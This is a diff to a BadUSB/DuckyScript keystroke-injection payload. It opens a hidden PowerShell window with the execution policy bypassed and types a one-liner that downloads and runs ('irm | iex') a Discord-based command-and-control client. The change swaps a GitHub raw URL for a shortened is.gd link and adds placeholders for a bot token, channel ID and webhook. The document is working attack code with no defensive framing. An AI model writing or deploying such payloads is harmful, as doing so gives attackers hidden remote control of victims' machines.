@@ -19,9 +19,9 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H
+STRING powershell -NoP -Ep Bypass -W H -C 
 ENTER
 DELAY 5000
-STRING $hookurl = 'WEBHOOK_HERE'; $ghurl = 'PASTEBIN_URL_HERE'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex
+STRING $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex
 ENTER
 
